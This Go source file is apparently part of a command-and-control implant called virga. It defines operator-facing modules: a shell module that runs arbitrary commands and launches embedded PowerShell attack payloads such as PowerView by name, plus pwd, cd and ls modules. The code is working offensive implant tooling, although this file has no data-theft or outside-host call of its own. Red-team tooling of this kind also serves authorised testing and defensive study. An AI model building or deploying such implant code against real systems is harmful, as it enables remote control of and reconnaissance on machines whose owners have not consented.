package shell

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/r74tech/virga/internal/implant/logger"
	"github.com/r74tech/virga/internal/implant/payloads"
)

// ShellModule is a module for executing shell commands
type ShellModule struct{}

// Name returns the module name
func (m *ShellModule) Name() string {
	return "shell"
}

// Execute executes a shell command
func (m *ShellModule) Execute(args []string) (string, int, error) {
	if len(args) == 0 {
		return "", 1, fmt.Errorf("no command specified")
	}

	command := args[0]
	log := logger.Get()

	// Log before command execution
	log.Debug("Shell module executing command", map[string]interface{}{
		"command": command,
	})

	if handled, output, exitCode, err := m.tryExecutePayloadCommand(command); handled {
		log.LogCommand(command, output, exitCode, err)
		return output, exitCode, err
	}

	output, exitCode, err := executeShellCommand(command)

	// Log after command execution
	log.LogCommand(command, output, exitCode, err)

	return output, exitCode, err
}

// tryExecutePayloadCommand checks if the operator requested an embedded payload (e.g. @powerview)
// and executes it through the appropriate interpreter if available.
func (m *ShellModule) tryExecutePayloadCommand(command string) (bool, string, int, error) {
	trimmed := strings.TrimSpace(command)
	if trimmed == "" || !strings.HasPrefix(trimmed, "@") {
		return false, "", 0, nil
	}

	parts, err := parseCommandLine(trimmed)
	if err != nil {
		return true, "", 1, err
	}
	if len(parts) == 0 {
		return true, "", 1, fmt.Errorf("payload name is required")
	}

	name := strings.TrimPrefix(parts[0], "@")
	if name == "" {
		return true, "", 1, fmt.Errorf("payload name is required")
	}

	embedded, exists := payloads.GetEmbeddedPayload(name)
	if !exists {
		return true, "", 1, fmt.Errorf("payload %s not found", name)
	}

	remaining := strings.TrimSpace(strings.TrimPrefix(trimmed, parts[0]))

	switch strings.ToLower(embedded.Type) {
	case "powershell", "ps":
		output, exitCode, execErr := executePowerShellPayload(embedded, remaining)
		return true, output, exitCode, execErr
	default:
		return true, "", 1, fmt.Errorf("unsupported payload type: %s", embedded.Type)
	}
}

// parseCommandLine parses a command line string into an array of arguments
func parseCommandLine(command string) ([]string, error) {
	var args []string
	var current string
	inQuote := false
	quoteChar := rune(0)
	escape := false
	hasToken := false // Track if we have a token to add

	for _, c := range command {
		if escape {
			current += string(c)
			escape = false
			hasToken = true
			continue
		}

		switch {
		case c == '\\':
			escape = true
		case c == '"' || c == '\'':
			if inQuote && c == quoteChar {
				inQuote = false
				quoteChar = rune(0)
				hasToken = true // Even empty quotes count as a token
			} else if !inQuote {
				inQuote = true
				quoteChar = c
			} else {
				current += string(c)
				hasToken = true
			}
		case c == ' ' && !inQuote:
			if hasToken {
				args = append(args, current)
				current = ""
				hasToken = false
			}
		default:
			current += string(c)
			hasToken = true
		}
	}

	if hasToken {
		args = append(args, current)
	}

	return args, nil
}

// resolveExecutablePath resolves the full path of an executable
func resolveExecutablePath(executable string) (string, error) {
	// If it's already an absolute path
	if filepath.IsAbs(executable) {
		return executable, nil
	}

	// If the relative path contains / or \
	if strings.Contains(executable, "/") || strings.Contains(executable, "\\") {
		absPath, err := filepath.Abs(executable)
		if err != nil {
			return "", err
		}
		return absPath, nil
	}

	// Search from PATH environment variable
	path, err := exec.LookPath(executable)
	if err != nil {
		// If it's a common system command, try standard locations
		return trySystemPaths(executable)
	}

	return path, nil
}

// PwdModule is a module to get the current directory
type PwdModule struct{}

func (m *PwdModule) Name() string {
	return "pwd"
}

func (m *PwdModule) Execute(args []string) (string, int, error) {
	log := logger.Get()

	pwd, err := os.Getwd()
	if err != nil {
		log.LogCommand("pwd", "", 1, err)
		return fmt.Sprintf("Error: %s", err), 1, err
	}

	log.LogCommand("pwd", pwd, 0, nil)
	return pwd, 0, nil
}

// CdModule is a module to change the directory
type CdModule struct{}

func (m *CdModule) Name() string {
	return "cd"
}

func (m *CdModule) Execute(args []string) (string, int, error) {
	log := logger.Get()

	if len(args) == 0 {
		err := fmt.Errorf("no directory specified")
		log.LogCommand("cd", "", 1, err)
		return "Error: no directory specified", 1, err
	}

	dir := args[0]
	if err := os.Chdir(dir); err != nil {
		log.LogCommand(fmt.Sprintf("cd %s", dir), "", 1, err)
		return fmt.Sprintf("Error: %s", err), 1, err
	}

	// Return the new directory
	pwd, _ := os.Getwd()
	log.LogCommand(fmt.Sprintf("cd %s", dir), pwd, 0, nil)
	return pwd, 0, nil
}

// LsModule is a module to list directory contents
type LsModule struct{}

func (m *LsModule) Name() string {
	return "ls"
}

func (m *LsModule) Execute(args []string) (string, int, error) {
	log := logger.Get()

	dir := "."
	if len(args) > 0 {
		dir = args[0]
	}

	cmd := fmt.Sprintf("ls %s", dir)

	entries, err := os.ReadDir(dir)
	if err != nil {
		log.LogCommand(cmd, "", 1, err)
		return fmt.Sprintf("Error: %s", err), 1, err
	}

	var output strings.Builder
	for _, entry := range entries {
		info, _ := entry.Info()
		if info != nil {
			output.WriteString(fmt.Sprintf("%s\t%d\t%s\n",
				info.Mode(), info.Size(), entry.Name()))
		} else {
			output.WriteString(fmt.Sprintf("%s\n", entry.Name()))
		}
	}

	result := output.String()
	log.LogCommand(cmd, result, 0, nil)
	return result, 0, nil
}
